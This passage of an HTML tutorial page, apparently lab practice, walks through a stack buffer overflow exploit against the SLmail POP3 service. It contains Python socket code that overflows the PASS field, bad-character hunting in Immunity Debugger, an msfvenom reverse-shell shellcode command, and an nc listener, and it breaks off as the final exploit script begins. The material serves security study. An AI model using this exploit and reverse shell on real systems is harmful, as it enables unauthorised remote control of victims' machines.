">buffer</span></span><span data-offset-key="fbcf836706534db984e889a66fa0680c:1"><span class="prism-token token 61 operator ">=</span></span><span data-offset-key="fbcf836706534db984e889a66fa0680c:2"><span class="prism-token token 62"> </span></span><span data-offset-key="fbcf836706534db984e889a66fa0680c:3"><span class="prism-token token 63 string ">&quot;A&quot;</span></span><span data-offset-key="fbcf836706534db984e889a66fa0680c:4"><span class="prism-token token 64"> </span></span><span data-offset-key="fbcf836706534db984e889a66fa0680c:5"><span class="prism-token token 65 operator ">*</span></span><span data-offset-key="fbcf836706534db984e889a66fa0680c:6"><span class="prism-token token 66"> </span></span><span data-offset-key="fbcf836706534db984e889a66fa0680c:7"><span class="prism-token token 67 number ">2606</span></span><span data-offset-key="fbcf836706534db984e889a66fa0680c:8"><span class="prism-token token 68"> </span></span><span data-offset-key="fbcf836706534db984e889a66fa0680c:9"><span class="prism-token token 69 operator ">+</span></span><span data-offset-key="fbcf836706534db984e889a66fa0680c:10"><span class="prism-token token 70"> </span></span><span data-offset-key="fbcf836706534db984e889a66fa0680c:11"><span class="prism-token token 71 string ">&quot;B&quot;</span></span><span data-offset-key="fbcf836706534db984e889a66fa0680c:12"><span class="prism-token token 72"> </span></span><span data-offset-key="fbcf836706534db984e889a66fa0680c:13"><span class="prism-token token 73 operator ">*</span></span><span data-offset-key="fbcf836706534db984e889a66fa0680c:14"><span class="prism-token token 74"> </span></span><span data-offset-key="fbcf836706534db984e889a66fa0680c:15"><span class="prism-token token 75 number ">4</span></span><span data-offset-key="fbcf836706534db984e889a66fa0680c:16"><span class="prism-token token 76"> </span></span><span data-offset-key="fbcf836706534db984e889a66fa0680c:17"><span class="prism-token token 77 operator ">+</span></span><span data-offset-key="fbcf836706534db984e889a66fa0680c:18"><span class="prism-token token 78"> badchars</span></span></span></div><div class="codeLine-a3169fbc" data-key="75a8adeb875246f2b1dba100a0e1381b"><span data-key="36d494e5229b4a1a81b47278c3186c05"><span data-offset-key="36d494e5229b4a1a81b47278c3186c05:0"><span data-slate-zero-width="n">​</span></span></span></div><div class="codeLine-a3169fbc" data-key="8ca564ef45a84bfcaca25e8899c21de7"><span data-key="0bd266ff36ed45b6b3bd04b7de55e023"><span data-offset-key="0bd266ff36ed45b6b3bd04b7de55e023:0"><span class="prism-token token 79 keyword ">try</span></span><span data-offset-key="0bd266ff36ed45b6b3bd04b7de55e023:1"><span class="prism-token token 80 punctuation ">:</span></span><span data-offset-key="0bd266ff36ed45b6b3bd04b7de55e023:2"><span class="prism-token token 81"> </span></span></span></div><div class="codeLine-a3169fbc" data-key="1726732b0cec4bc8b119e09ad6afbdff"><span data-key="ceae7848f12042658ebdf6bb5ba4f4c9"><span data-offset-key="ceae7848f12042658ebdf6bb5ba4f4c9:0"><span class="prism-token token 81">    </span></span><span data-offset-key="ceae7848f12042658ebdf6bb5ba4f4c9:1"><span class="prism-token token 82 keyword ">print</span></span><span data-offset-key="ceae7848f12042658ebdf6bb5ba4f4c9:2"><span class="prism-token token 83"> </span></span><span data-offset-key="ceae7848f12042658ebdf6bb5ba4f4c9:3"><span class="prism-token token 84 string ">&quot;\nSending buffer...&quot;</span></span></span></div><div class="codeLine-a3169fbc" data-key="5cae6ae46e804cec8dc18ae82c938823"><span data-key="f7dbd10027dd42adbb92c0f7c5407b39"><span data-offset-key="f7dbd10027dd42adbb92c0f7c5407b39:0"><span class="prism-token token 86 comment "># Connect to Windows 7 machine, POP3 service    </span></span></span></div><div class="codeLine-a3169fbc" data-key="ca938e7b7e2e46a396abccec76b3f03b"><span data-key="ee3edaf2b55c45c3a2fafee1e68d8194"><span data-offset-key="ee3edaf2b55c45c3a2fafee1e68d8194:0"><span class="prism-token token 87">    s</span></span><span data-offset-key="ee3edaf2b55c45c3a2fafee1e68d8194:1"><span class="prism-token token 88 punctuation ">.</span></span><span data-offset-key="ee3edaf2b55c45c3a2fafee1e68d8194:2"><span class="prism-token token 89">connect</span></span><span data-offset-key="ee3edaf2b55c45c3a2fafee1e68d8194:3"><span class="prism-token token 90 punctuation ">(</span></span><span data-offset-key="ee3edaf2b55c45c3a2fafee1e68d8194:4"><span class="prism-token token 91 punctuation ">(</span></span><span data-offset-key="ee3edaf2b55c45c3a2fafee1e68d8194:5"><span class="prism-token token 92 string ">&#x27;10.0.0.1&#x27;</span></span><span data-offset-key="ee3edaf2b55c45c3a2fafee1e68d8194:6"><span class="prism-token token 93 punctuation ">,</span></span><span data-offset-key="ee3edaf2b55c45c3a2fafee1e68d8194:7"><span class="prism-token token 94 number ">110</span></span><span data-offset-key="ee3edaf2b55c45c3a2fafee1e68d8194:8"><span class="prism-token token 95 punctuation ">)</span></span><span data-offset-key="ee3edaf2b55c45c3a2fafee1e68d8194:9"><span class="prism-token token 96 punctuation ">)</span></span></span></div><div class="codeLine-a3169fbc" data-key="4172a49a840a4c6aa4f17324b3a7e2fa"><span data-key="0d7db94b70324aa2a9b5fa04b8ed5ec8"><span data-offset-key="0d7db94b70324aa2a9b5fa04b8ed5ec8:0"><span class="prism-token token 97">    data </span></span><span data-offset-key="0d7db94b70324aa2a9b5fa04b8ed5ec8:1"><span class="prism-token token 98 operator ">=</span></span><span data-offset-key="0d7db94b70324aa2a9b5fa04b8ed5ec8:2"><span class="prism-token token 99"> s</span></span><span data-offset-key="0d7db94b70324aa2a9b5fa04b8ed5ec8:3"><span class="prism-token token 100 punctuation ">.</span></span><span data-offset-key="0d7db94b70324aa2a9b5fa04b8ed5ec8:4"><span class="prism-token token 101">recv</span></span><span data-offset-key="0d7db94b70324aa2a9b5fa04b8ed5ec8:5"><span class="prism-token token 102 punctuation ">(</span></span><span data-offset-key="0d7db94b70324aa2a9b5fa04b8ed5ec8:6"><span class="prism-token token 103 number ">1024</span></span><span data-offset-key="0d7db94b70324aa2a9b5fa04b8ed5ec8:7"><span class="prism-token token 104 punctuation ">)</span></span></span></div><div class="codeLine-a3169fbc" data-key="c866baa35531406d8f849c59e68d4f4a"><span data-key="257076c1288e4b86bb83370adc6d485a"><span data-offset-key="257076c1288e4b86bb83370adc6d485a:0"><span class="prism-token token 105">    s</span></span><span data-offset-key="257076c1288e4b86bb83370adc6d485a:1"><span class="prism-token token 106 punctuation ">.</span></span><span data-offset-key="257076c1288e4b86bb83370adc6d485a:2"><span class="prism-token token 107">send</span></span><span data-offset-key="257076c1288e4b86bb83370adc6d485a:3"><span class="prism-token token 108 punctuation ">(</span></span><span data-offset-key="257076c1288e4b86bb83370adc6d485a:4"><span class="prism-token token 109 string ">&#x27;USER username&#x27;</span></span><span data-offset-key="257076c1288e4b86bb83370adc6d485a:5"><span class="prism-token token 110"> </span></span><span data-offset-key="257076c1288e4b86bb83370adc6d485a:6"><span class="prism-token token 111 operator ">+</span></span><span data-offset-key="257076c1288e4b86bb83370adc6d485a:7"><span class="prism-token token 112"> </span></span><span data-offset-key="257076c1288e4b86bb83370adc6d485a:8"><span class="prism-token token 113 string ">&#x27;\r\n&#x27;</span></span><span data-offset-key="257076c1288e4b86bb83370adc6d485a:9"><span class="prism-token token 114 punctuation ">)</span></span></span></div><div class="codeLine-a3169fbc" data-key="dfb8293b9d6f493ebb53805a32481906"><span data-key="8b7e6ff14fdb44cf805bb131b88663c8"><span data-offset-key="8b7e6ff14fdb44cf805bb131b88663c8:0"><span class="prism-token token 115">    data </span></span><span data-offset-key="8b7e6ff14fdb44cf805bb131b88663c8:1"><span class="prism-token token 116 operator ">=</span></span><span data-offset-key="8b7e6ff14fdb44cf805bb131b88663c8:2"><span class="prism-token token 117"> s</span></span><span data-offset-key="8b7e6ff14fdb44cf805bb131b88663c8:3"><span class="prism-token token 118 punctuation ">.</span></span><span data-offset-key="8b7e6ff14fdb44cf805bb131b88663c8:4"><span class="prism-token token 119">recv</span></span><span data-offset-key="8b7e6ff14fdb44cf805bb131b88663c8:5"><span class="prism-token token 120 punctuation ">(</span></span><span data-offset-key="8b7e6ff14fdb44cf805bb131b88663c8:6"><span class="prism-token token 121 number ">1024</span></span><span data-offset-key="8b7e6ff14fdb44cf805bb131b88663c8:7"><span class="prism-token token 122 punctuation ">)</span></span></span></div><div class="codeLine-a3169fbc" data-key="dd7b86ce6ca641a3b207ba38ff48be30"><span data-key="8e16df14b0624f408cf1d9a17f671300"><span data-offset-key="8e16df14b0624f408cf1d9a17f671300:0"><span class="prism-token token 123">    s</span></span><span data-offset-key="8e16df14b0624f408cf1d9a17f671300:1"><span class="prism-token token 124 punctuation ">.</span></span><span data-offset-key="8e16df14b0624f408cf1d9a17f671300:2"><span class="prism-token token 125">send</span></span><span data-offset-key="8e16df14b0624f408cf1d9a17f671300:3"><span class="prism-token token 126 punctuation ">(</span></span><span data-offset-key="8e16df14b0624f408cf1d9a17f671300:4"><span class="prism-token token 127 string ">&#x27;PASS &#x27;</span></span><span data-offset-key="8e16df14b0624f408cf1d9a17f671300:5"><span class="prism-token token 128"> </span></span><span data-offset-key="8e16df14b0624f408cf1d9a17f671300:6"><span class="prism-token token 129 operator ">+</span></span><span data-offset-key="8e16df14b0624f408cf1d9a17f671300:7"><span class="prism-token token 130"> </span></span><span data-offset-key="8e16df14b0624f408cf1d9a17f671300:8"><span class="prism-token token 131 builtin ">buffer</span></span><span data-offset-key="8e16df14b0624f408cf1d9a17f671300:9"><span class="prism-token token 132"> </span></span><span data-offset-key="8e16df14b0624f408cf1d9a17f671300:10"><span class="prism-token token 133 operator ">+</span></span><span data-offset-key="8e16df14b0624f408cf1d9a17f671300:11"><span class="prism-token token 134"> </span></span><span data-offset-key="8e16df14b0624f408cf1d9a17f671300:12"><span class="prism-token token 135 string ">&#x27;\r\n&#x27;</span></span><span data-offset-key="8e16df14b0624f408cf1d9a17f671300:13"><span class="prism-token token 136 punctuation ">)</span></span></span></div><div class="codeLine-a3169fbc" data-key="0936fa80af9947be971365c31ea83e28"><span data-key="2044c4913b954434b7ff4321b108afee"><span data-offset-key="2044c4913b954434b7ff4321b108afee:0"><span class="prism-token token 137">    </span></span><span data-offset-key="2044c4913b954434b7ff4321b108afee:1"><span class="prism-token token 138 keyword ">print</span></span><span data-offset-key="2044c4913b954434b7ff4321b108afee:2"><span class="prism-token token 139"> </span></span><span data-offset-key="2044c4913b954434b7ff4321b108afee:3"><span class="prism-token token 140 string ">&quot;\nDone!&quot;</span></span></span></div><div class="codeLine-a3169fbc" data-key="d4cfc4b7ef03488ba450ff1125104fb5"><span data-key="c11ab6bd843f47e1914da9bfd4c2edce"><span data-offset-key="c11ab6bd843f47e1914da9bfd4c2edce:0"><span data-slate-zero-width="n">​</span></span></span></div><div class="codeLine-a3169fbc" data-key="320e62297df24222912728d4f7b344bb"><span data-key="e68af68818e54cff8cc57f2dfd37cfdb"><span data-offset-key="e68af68818e54cff8cc57f2dfd37cfdb:0"><span class="prism-token token 142 keyword ">except</span></span><span data-offset-key="e68af68818e54cff8cc57f2dfd37cfdb:1"><span class="prism-token token 143 punctuation ">:</span></span></span></div><div class="codeLine-a3169fbc" data-key="154464566767402bb770c1df162863c7"><span data-key="5f23c8c7ceaa46e293af40b657800c3b"><span data-offset-key="5f23c8c7ceaa46e293af40b657800c3b:0"><span class="prism-token token 144">    </span></span><span data-offset-key="5f23c8c7ceaa46e293af40b657800c3b:1"><span class="prism-token token 145 keyword ">print</span></span><span data-offset-key="5f23c8c7ceaa46e293af40b657800c3b:2"><span class="prism-token token 146"> </span></span><span data-offset-key="5f23c8c7ceaa46e293af40b657800c3b:3"><span class="prism-token token 147 string ">&quot;Could not connect!&quot;</span></span></span></div></pre></div><p class="blockParagraph-544a408c" data-key="9afaad5a557b4c24a3fe204ecc0bac5f"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="63e41eb3742f421f849f10fb2d249771"><span data-offset-key="63e41eb3742f421f849f10fb2d249771:0">Note: The ASCII character </span><span data-offset-key="63e41eb3742f421f849f10fb2d249771:1"><code spellcheck="false" class="code-81e98f88" data-slate-leaf="true">\x00</code></span><span data-offset-key="63e41eb3742f421f849f10fb2d249771:2"> is left out because it&#x27;s a null byte, which immediately terminates the remainder of the shellcode. It&#x27;s always a bad character.</span></span></span></p><p class="blockParagraph-544a408c" data-key="9633a31bad354504a6868f0065419d32"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="8b6c33d88d5f4cb4a2ed28f29c811b0f"><span data-offset-key="8b6c33d88d5f4cb4a2ed28f29c811b0f:0">Start the SLmail POP3 service, attach it to Immunity Debugger and run your Python script. You&#x27;ll notice that the EIP has been overwritten with </span><span data-offset-key="8b6c33d88d5f4cb4a2ed28f29c811b0f:1"><code spellcheck="false" class="code-81e98f88" data-slate-leaf="true">42424242</code></span><span data-offset-key="8b6c33d88d5f4cb4a2ed28f29c811b0f:2"> (the 4 Bs you added to the buffer after the 2606 As).</span></span></span></p><p class="blockParagraph-544a408c" data-key="466b551a1b6247168a6a2322a1924a13"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="df871196b4894c1ebffaaa764b5fb464"><span data-offset-key="df871196b4894c1ebffaaa764b5fb464:0">The next step is to find your buffer string in the dump. In the Registers area of Immunity, click on the memory address where the string of As went in (ECX), then right-click and choose </span><span data-offset-key="df871196b4894c1ebffaaa764b5fb464:1"><code spellcheck="false" class="code-81e98f88" data-slate-leaf="true">Follow in Dump</code></span><span data-offset-key="df871196b4894c1ebffaaa764b5fb464:2">.  The dump area will change and show your buffer string: </span></span></span></p><div data-slate-void="true" data-key="639595175ca64a829e84e56a4f5fa407"><div><figure data-key="639595175ca64a829e84e56a4f5fa407" contenteditable="false" class="reset-3c756112--figure-c0d4b308--figureWithCaption-408420be"><div class="reset-3c756112--figureAlignCenter-2d9bf702"><div class="reset-3c756112--figureLayer-b6ab7c94"><img tabindex="0" src="https://blobs.gitbook.com/assets%2F-LMNRaGfniDGOexfu2Y6%2F-LTYT_zvZqSJHJhAma7D%2F-LTYmN7Gy_M-eOaZ04XD%2Fdump.jpg?alt=media&amp;token=7381db07-b748-4f39-b37d-2cbeed5dcb6d" class="image-52799b3c" style="cursor:zoom-in"/></div></div><div class="reset-3c756112--figureAlignCenter-2d9bf702"><figcaption class="caption-8750cb6e"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1" style="max-width:100%">Finding your buffer string in the dump</span></figcaption></div></figure></div></div><p class="blockParagraph-544a408c" data-key="6eabd27cd11e4ed49f13999d1c6057ed"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="564d0e4e672d43b8a8c013b20b720456"><span data-offset-key="564d0e4e672d43b8a8c013b20b720456:0">You&#x27;ll notice that the ASCII sequence displays normally at first, but instead of showing </span><span data-offset-key="564d0e4e672d43b8a8c013b20b720456:1"><code spellcheck="false" class="code-81e98f88" data-slate-leaf="true">0A</code></span><span data-offset-key="564d0e4e672d43b8a8c013b20b720456:2"> next it shows </span><span data-offset-key="564d0e4e672d43b8a8c013b20b720456:3"><code spellcheck="false" class="code-81e98f88" data-slate-leaf="true">29</code></span><span data-offset-key="564d0e4e672d43b8a8c013b20b720456:4">. That means </span><span data-offset-key="564d0e4e672d43b8a8c013b20b720456:5"><code spellcheck="false" class="code-81e98f88" data-slate-leaf="true">\x0a</code></span><span data-offset-key="564d0e4e672d43b8a8c013b20b720456:6"> is a bad character:</span></span></span></p><div class="reset-3c756112--codeBlockWrapper-56f27afc"><div contenteditable="false" class="reset-3c756112--copyButtonWrapper-ca591f6e"><div aria-label="Copy" role="button" tabindex="0" class="reset-3c756112--touchableView-a079aa82--copyButton-4f9a9412--tooltipped-57ae51fe"><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke="currentColor" class="icon-7f6730be--text-3f89f380"><g><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></g></svg></div></div><pre data-key="b0cdb6aa2f7b4f1b9f5368295e040d21" spellcheck="false" class="reset-3c756112--codeBlock-75b39b81"><div class="codeLine-a3169fbc" data-key="8e93981b68ac45afa6e878afb31947d9"><span data-key="7b076248b46a4e5da6316260fdd0729c"><span data-offset-key="7b076248b46a4e5da6316260fdd0729c:0">\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a # ASCII sequence in python script</span></span></div><div class="codeLine-a3169fbc" data-key="41de3e5d69874a1da45320f47ab21c21"><span data-key="e0412f3932b04d8aa53b8c40c495b364"><span data-offset-key="e0412f3932b04d8aa53b8c40c495b364:0">01 02 03 04 05 06 07 08 09 29            # Hex dump in Immunity</span></span></div><div class="codeLine-a3169fbc" data-key="b142aab060494649a3be2fb216d118a7"><span data-key="c39d47cd9170419b8e1c41a54279b9ae"><span data-offset-key="c39d47cd9170419b8e1c41a54279b9ae:0"><span data-slate-zero-width="n">​</span></span></span></div></pre></div><p class="blockParagraph-544a408c" data-key="5995d117ae5c4b89a3c220dacb8e2a60"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="4877c2d4237d4fdab54c921c52c2c8ab"><span data-offset-key="4877c2d4237d4fdab54c921c52c2c8ab:0">Remove it from your python script and run it again, following the dump to find the next bad character. As you can see, the sequence proceeds (without the</span><span data-offset-key="4877c2d4237d4fdab54c921c52c2c8ab:1"><code spellcheck="false" class="code-81e98f88" data-slate-leaf="true">0A</code></span><span data-offset-key="4877c2d4237d4fdab54c921c52c2c8ab:2">) until we expect to see </span><span data-offset-key="4877c2d4237d4fdab54c921c52c2c8ab:3"><code spellcheck="false" class="code-81e98f88" data-slate-leaf="true">0D</code></span><span data-offset-key="4877c2d4237d4fdab54c921c52c2c8ab:4"> but it&#x27;s missing. That means </span><span data-offset-key="4877c2d4237d4fdab54c921c52c2c8ab:5"><code spellcheck="false" class="code-81e98f88" data-slate-leaf="true">\x0d</code></span><span data-offset-key="4877c2d4237d4fdab54c921c52c2c8ab:6"> is a bad character:</span></span></span></p><div data-slate-void="true" data-key="3e64fb1a698b436b9adcd38d3ce1cb25"><div><figure data-key="3e64fb1a698b436b9adcd38d3ce1cb25" contenteditable="false" class="reset-3c756112--figure-c0d4b308--figureWithCaption-408420be"><div class="reset-3c756112--figureAlignCenter-2d9bf702"><div class="reset-3c756112--figureLayer-b6ab7c94"><img tabindex="0" src="https://blobs.gitbook.com/assets%2F-LMNRaGfniDGOexfu2Y6%2F-LTYT_zvZqSJHJhAma7D%2F-LTYrBNq57LM9XWavXjT%2Fdump2.jpg?alt=media&amp;token=6565b5e2-0f92-49a9-8c6b-4223f97a0f9d" class="image-52799b3c" style="cursor:zoom-in"/></div></div><div class="reset-3c756112--figureAlignCenter-2d9bf702"><figcaption class="caption-8750cb6e"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1" style="max-width:100%">Finding the next bad character</span></figcaption></div></figure></div></div><p class="blockParagraph-544a408c" data-key="690059b19e144663b69bee141e80dfe3"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="faa6af7813d641309a370d3e60f99308"><span data-offset-key="faa6af7813d641309a370d3e60f99308:0">I bet you&#x27;re really hating yourself now, having to pick through a bunch of microscopic letters looking for errors. Suck it up, remove the </span><span data-offset-key="faa6af7813d641309a370d3e60f99308:1"><code spellcheck="false" class="code-81e98f88" data-slate-leaf="true">\x0d</code></span><span data-offset-key="faa6af7813d641309a370d3e60f99308:2"> from your python script and run it again. You should see your entire sequence of ASCII characters with no further errors:</span></span></span></p><div data-slate-void="true" data-key="b932bbe9bf094323a98c98895ed7edbd"><div><figure data-key="b932bbe9bf094323a98c98895ed7edbd" contenteditable="false" class="reset-3c756112--figure-c0d4b308--figureWithCaption-408420be"><div class="reset-3c756112--figureAlignCenter-2d9bf702"><div class="reset-3c756112--figureLayer-b6ab7c94"><img tabindex="0" src="https://blobs.gitbook.com/assets%2F-LMNRaGfniDGOexfu2Y6%2F-LTYrUWeMvHBcDUz1QGd%2F-LTYtbuTMhfSsxCCuSBv%2FScreen%20Shot%202018-12-12%20at%202.29.49%20PM.png?alt=media&amp;token=d5b99445-92ae-4749-8d76-819d89635231" class="image-52799b3c" style="cursor:zoom-in"/></div></div><div class="reset-3c756112--figureAlignCenter-2d9bf702"><figcaption class="caption-8750cb6e"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1" style="max-width:100%">All bad characters removed</span></figcaption></div></figure></div></div><p class="blockParagraph-544a408c" data-key="5dbce210fd97498f8e07de800298b1d2"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="e841237f78324684afb1879d7874b0e1"><span data-offset-key="e841237f78324684afb1879d7874b0e1:0">Now we know that there are 3 bad characters which should be removed from our shellcode: </span><span data-offset-key="e841237f78324684afb1879d7874b0e1:1"><code spellcheck="false" class="code-81e98f88" data-slate-leaf="true">\x00 \x0a \x0d</code></span><span data-offset-key="e841237f78324684afb1879d7874b0e1:2">. Generate your shellcode using this msfvenom command:</span></span></span></p><p class="blockParagraph-544a408c" data-key="3099ffc1574440bdb4e3bd5b784d7ad8"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="b7d74586deba4bb38d6b21484b9eb034"><span data-offset-key="b7d74586deba4bb38d6b21484b9eb034:0"><code spellcheck="false" class="code-81e98f88" data-slate-leaf="true">msfvenom -p windows/shell_reverse_tcp LHOST=[attack machine IP] LPORT=443 -f c -a x86 --platform windows -b &quot;\x00\x0A\x0D&quot; -e x86/shikata_ga_nai</code></span></span></span></p><p class="blockParagraph-544a408c" data-key="695006d593ea4aecb7559e3dc11a89fa"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="bb16884b71d043cea163e5afbf0d96e8"><span data-offset-key="bb16884b71d043cea163e5afbf0d96e8:0">The </span><span data-offset-key="bb16884b71d043cea163e5afbf0d96e8:1"><code spellcheck="false" class="code-81e98f88" data-slate-leaf="true">-b</code></span><span data-offset-key="bb16884b71d043cea163e5afbf0d96e8:2"> option is where you identify the bad characters. Copy the output and keep it somewhere safe until the final step. </span></span></span></p><h2 id="assemble-the-exploit" class="blockHeading-442b4f12--blockHeading2WithMargin-532d771d" data-key="316b62aaa4bc4af79205d65f587c95cb"><div class="blockHeadingContent-756c9114"><span class="text-4505230f--HeadingH600-23f228db--textContentFamily-49a318e1"><span data-key="f9f8dfee8d434774aa6a89b7153d25f4"><span data-offset-key="f9f8dfee8d434774aa6a89b7153d25f4:0">Assemble the exploit</span></span></span><a href="#assemble-the-exploit" contenteditable="false" class="blockHeadingAnchor-34f75d78--blockHeadingAnchorHidden-d69b5eda"><span class="blockHeadingAnchorIcon-1c2bf3cb"><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke="currentColor" class="icon-7f6730be--text-3f89f380"><g><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></g></svg></span></a></div></h2><p class="blockParagraph-544a408c" data-key="8a33123a693b42548bdab595776c5c9b"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="1907f5a0930247a7ba2d125323c6fb81"><span data-offset-key="1907f5a0930247a7ba2d125323c6fb81:0">It&#x27;s time to put together your fancy cake:</span></span></span></p><ul class="list-20526648" data-key="ff2b1f40f68844c7ac9dc44d91545d77"><li class=""><div data-key="07af7520539844d39d9c4e2c8cf834b7" class="reset-3c756112--listItemContent-756c9114"><p class="blockParagraph-544a408c--noMargin-acdf7afa" data-key="c0c0660fe8b14ba3a84c7e9d26ffc63d"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="4201d0a0f58741f496de459f749fc8fb"><span data-offset-key="4201d0a0f58741f496de459f749fc8fb:0">2606 As (to hit the EIP)</span></span></span></p></div></li><li class=""><div data-key="7f288a2ac8cb4f74a2c8db9aecc8860c" class="reset-3c756112--listItemContent-756c9114"><p class="blockParagraph-544a408c--noMargin-acdf7afa" data-key="2c0d32accb224439810fd8be65394b8c"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="c63a2c8f66784d248e0c57f64a2abe47"><span data-offset-key="c63a2c8f66784d248e0c57f64a2abe47:0"><code spellcheck="false" class="code-81e98f88" data-slate-leaf="true">JMP ESP</code></span><span data-offset-key="c63a2c8f66784d248e0c57f64a2abe47:1"> memory address put in </span><span data-offset-key="c63a2c8f66784d248e0c57f64a2abe47:2"><strong class="bold-3c254bd9" data-slate-leaf="true">backwards</strong></span><span data-offset-key="c63a2c8f66784d248e0c57f64a2abe47:3"> (overwrite EIP and redirect execution)</span></span></span></p></div></li><li class=""><div data-key="7e6bbd1cea60442281ad8c4a4413a789" class="reset-3c756112--listItemContent-756c9114"><p class="blockParagraph-544a408c--noMargin-acdf7afa" data-key="c6d666fa0e4844f09b2c584fcf191bfc"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="169c246d55d54a929af1c67f1c2e47a3"><span data-offset-key="169c246d55d54a929af1c67f1c2e47a3:0">16 nops (breathing room)</span></span></span></p></div></li><li class=""><div data-key="477a4028ef3c413ab816c1c5d3d2d924" class="reset-3c756112--listItemContent-756c9114"><p class="blockParagraph-544a408c--noMargin-acdf7afa" data-key="67ef06782e8d410787ad32ce74bf4662"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="d0849ee654a9468eb0c86301e8ecf034"><span data-offset-key="d0849ee654a9468eb0c86301e8ecf034:0">Shellcode (sends you a shell)</span></span></span></p></div></li></ul><p class="blockParagraph-544a408c" data-key="c5bb2f7cef7b47a69b5414180447d714"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="866c5effa7744823ac9dc1da569138fa"><span data-offset-key="866c5effa7744823ac9dc1da569138fa:0">As mentioned before, a nopsled is useful if you don&#x27;t know the exact location of the ESP and want to &quot;slide&quot; into your shellcode, or if you want to prevent the Metasploit decoder at the beginning of your payload from </span></span><a class="link-a079aa82--primary-53a25e66--link-faf6c434" style="color:#bf272e" href="https://security.stackexchange.com/a/169622" target="_blank" rel="noopener noreferrer" data-key="8af71551befd4365bccafaf856cd928a"><span data-key="56fc0491224c4fdaacafc96803827bc3"><span data-offset-key="56fc0491224c4fdaacafc96803827bc3:0">overwriting the shellcode</span></span></a><span data-key="1810a3eb5bbc40e4b0aafb3e76b52df8"><span data-offset-key="1810a3eb5bbc40e4b0aafb3e76b52df8:0">. </span></span></span></p><p class="blockParagraph-544a408c" data-key="efdb1efb70e7420fa05398c7f9bbea34"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="e28bb5ff19d140ac8a6c556ef943b131"><span data-offset-key="e28bb5ff19d140ac8a6c556ef943b131:0">Remember to set up a listener on your Kali machine: </span></span></span></p><p class="blockParagraph-544a408c" data-key="2e9de6d2e44040ac87ff76d152de3312"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="66332d63d736449e805cf479c0578b7f"><span data-offset-key="66332d63d736449e805cf479c0578b7f:0"><code spellcheck="false" class="code-81e98f88" data-slate-leaf="true">nc -nlvp 443</code></span></span></span></p><p class="blockParagraph-544a408c" data-key="1404580f80e34175b0298eaccfde939d"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="e79414f1c6dd494a85320224f2d2e936"><span data-offset-key="e79414f1c6dd494a85320224f2d2e936:0">Then run your exploit:</span></span></span></p><div class="reset-3c756112--codeBlockWrapper-56f27afc"><div contenteditable="false" class="reset-3c756112--copyButtonWrapper-ca591f6e"><div aria-label="Copy" role="button" tabindex="0" class="reset-3c756112--touchableView-a079aa82--copyButton-4f9a9412--tooltipped-57ae51fe"><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke="currentColor" class="icon-7f6730be--text-3f89f380"><g><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></g></svg></div></div><pre data-key="64a77e685e7443e094f073cd60e1d771" spellcheck="false" class="reset-3c756112--codeBlock-75b39b81"><div class="codeLine-a3169fbc" data-key="00ca82315a444471a4f2f4512a2bf28d"><span data-key="c9d1a948b46d480e93a47645d80026a6"><span data-offset-key="c9d1a948b46d480e93a47645d80026a6:0"><span class="prism-token token  comment ">#!/usr/bin/python</span></span></span></div><div class="codeLine-a3169fbc" data-key="267db9fa8be148b5b918e13862b522a6"><span data-key="6c4443d3ab9d42cda87044016661c2ec"><span data-offset-key="6c4443d3ab9d42cda87044016661c2ec:0"><span data-slate-zero-width="n">​</span></span></span></div><div class="codeLine-a3169fbc" data-key="30e67f615ba24ddcbdb8be4cda6bd7eb"><span data-key="cd9377c600ef4398928dbc43d2a230ce"><span data-offset-key="cd9377c600ef4398928dbc43d2a230ce:0"><span class="prism-token token 2 keyword ">import</span></span><span data-offset-key="cd9377c600ef4398928dbc43d2a230ce:1"><span class="prism-token token 3"> socket</span></span></span></div><div class="codeLine-a3169fbc" data-key="072482dc95fa48c3ba5da8c7a7893225"><span data-key="71e80f68494248df818677a050ef277e"><span data-offset-key="71e80f68494248df818677a050ef277e:0"><span data-slate-zero-width="n">​</span></span></span></div><div 